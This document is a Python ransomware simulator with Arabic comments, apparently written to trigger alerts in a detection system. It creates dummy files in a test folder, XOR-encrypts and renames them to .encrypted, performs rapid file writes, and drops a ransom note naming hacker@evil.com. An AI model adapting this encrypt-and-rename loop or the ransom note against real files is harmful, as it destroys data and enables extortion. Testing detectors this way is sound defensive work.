"""
⚠️⚠️⚠️ WARNING - TESTING ONLY ⚠️⚠️⚠️
هذا فيروس اختباري لاختبار نظام الكشف فقط!
لا تستخدمه على ملفات حقيقية مهمة!

Basic Ransomware Simulator
- يقوم بتشفير بسيط للملفات
- يغير الامتدادات إلى .encrypted
- يعدل عدة ملفات بسرعة
"""

import os
import sys
import time
from pathlib import Path

# ⚠️ CONFIGURATION - غير هذه الإعدادات
TEST_DIRECTORY = r"C:\Users\Public\Documents\TestArea"  # المجلد للاختبار
FILE_EXTENSION = ".encrypted"  # الامتداد الجديد
NUM_FILES_TO_CREATE = 15  # عدد الملفات للإنشاء
NUM_FILES_TO_ENCRYPT = 10  # عدد الملفات للتشفير
DELAY_BETWEEN_FILES = 0.05  # التأخير بين الملفات (بالثواني)


def simple_encrypt(data):
    """تشفير بسيط جداً (XOR) - لأغراض الاختبار فقط"""
    key = 0xAA  # مفتاح بسيط
    return bytes([byte ^ key for byte in data])


def create_test_files(directory, count):
    """إنشاء ملفات اختبار"""
    print(f"[*] Creating {count} test files in {directory}")
    
    os.makedirs(directory, exist_ok=True)
    
    for i in range(count):
        filename = os.path.join(directory, f"document_{i}.txt")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"This is test document number {i}\n")
            f.write("Important data here!\n")
            f.write("Financial Report 2024\n")
            f.write("Confidential Information\n")
        print(f"    Created: {filename}")
        time.sleep(0.02)
    
    print(f"[✓] Created {count} test files successfully\n")


def encrypt_files(directory, count):
    """تشفير الملفات (محاكاة الرانسوم وير)"""
    print(f"[!] Starting encryption process...")
    print(f"[!] Target: {directory}")
    print(f"[!] Files to encrypt: {count}\n")
    
    time.sleep(1)  # تأخير قصير قبل البدء
    
    # الحصول على قائمة الملفات
    files = [f for f in os.listdir(directory) 
             if f.endswith('.txt') and os.path.isfile(os.path.join(directory, f))]
    
    if not files:
        print("[!] No .txt files found to encrypt!")
        return
    
    # تشفير الملفات
    encrypted_count = 0
    for filename in files[:count]:
        filepath = os.path.join(directory, filename)
        
        try:
            # قراءة المحتوى
            with open(filepath, 'rb') as f:
                original_data = f.read()
            
            # تشفير المحتوى
            encrypted_data = simple_encrypt(original_data)
            
            # كتابة المحتوى المشفر
            with open(filepath, 'wb') as f:
                f.write(encrypted_data)
            
            # تغيير الامتداد
            new_filepath = filepath + FILE_EXTENSION
            os.rename(filepath, new_filepath)
            
            encrypted_count += 1
            print(f"[✓] Encrypted: {filename} -> {os.path.basename(new_filepath)}")
            
            # تأخير بسيط بين الملفات
            time.sleep(DELAY_BETWEEN_FILES)
            
        except Exception as e:
            print(f"[✗] Failed to encrypt {filename}: {e}")
    
    print(f"\n[!] Encryption complete: {encrypted_count}/{count} files encrypted")
    
    # إنشاء ملف فدية
    ransom_note = os.path.join(directory, "RANSOM_NOTE.txt")
    with open(ransom_note, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
        f.write("="*60 + "\n\n")
        f.write("This is a TEST RANSOMWARE for detection system testing.\n")
        f.write("All your files have been encrypted with strong encryption.\n\n")
        f.write("To decrypt your files, you need to pay 1000 Bitcoin.\n")
        f.write("Contact: hacker@evil.com\n\n")
        f.write("="*60 + "\n")
        f.write("⚠️ THIS IS A TEST - Your files can be decrypted ⚠️\n")
        f.write("="*60 + "\n")
    
    print(f"[✓] Ransom note created: {ransom_note}")


def rapid_file_modification(directory, count):
    """تعديل سريع للملفات (محاكاة سلوك الرانسوم وير)"""
    print(f"\n[!] Starting rapid file modification attack...")
    
    for i in range(count):
        filename = os.path.join(directory, f"rapid_test_{i}.txt")
        with open(filename, 'w') as f:
            f.write(f"Modified at {time.time()}\n")
        
        # تعديل الملف مرة أخرى
        with open(filename, 'a') as f:
            f.write("Additional data\n")
        
        print(f"[✓] Modified: rapid_test_{i}.txt")
        time.sleep(DELAY_BETWEEN_FILES)
    
    print(f"[✓] Rapid modification complete: {count} files")


def main():
    print("\n" + "="*70)
    print("        ⚠️ RANSOMWARE SIMULATOR - TESTING ONLY ⚠️")
    print("="*70)
    print("\nThis is a TEST ransomware for detection system evaluation.")
    print(f"Target Directory: {TEST_DIRECTORY}")
    print("\n⚠️ WARNING: This will encrypt files in the target directory!")
    print("="*70 + "\n")
    
    # تأكيد من المستخدم
    response = input("Do you want to proceed? (yes/no): ").strip().lower()
    if response != 'yes':
        print("[!] Operation cancelled by user.")
        sys.exit(0)
    
    print("\n[*] Starting in 3 seconds...")
    time.sleep(3)
    
    # المرحلة 1: إنشاء ملفات اختبار
    create_test_files(TEST_DIRECTORY, NUM_FILES_TO_CREATE)
    
    # المرحلة 2: تعديل سريع (سيؤدي إلى تنبيه MEDIUM)
    rapid_file_modification(TEST_DIRECTORY, 15)
    
    # المرحلة 3: تشفير الملفات (سيؤدي إلى تنبيه HIGH/CRITICAL)
    encrypt_files(TEST_DIRECTORY, NUM_FILES_TO_ENCRYPT)
    
    print("\n" + "="*70)
    print("        🎯 ATTACK SIMULATION COMPLETE!")
    print("="*70)
    print("\n[*] Check your ransomware detection system for alerts.")
    print(f"[*] You should see HIGH or CRITICAL threat level alerts.")
    print(f"[*] Process should be identified as: python.exe")
    print("\n[*] To decrypt files, run: basic_ransomware_decrypt.py")
    print("="*70 + "\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Operation interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[✗] Error: {e}")
        sys.exit(1)
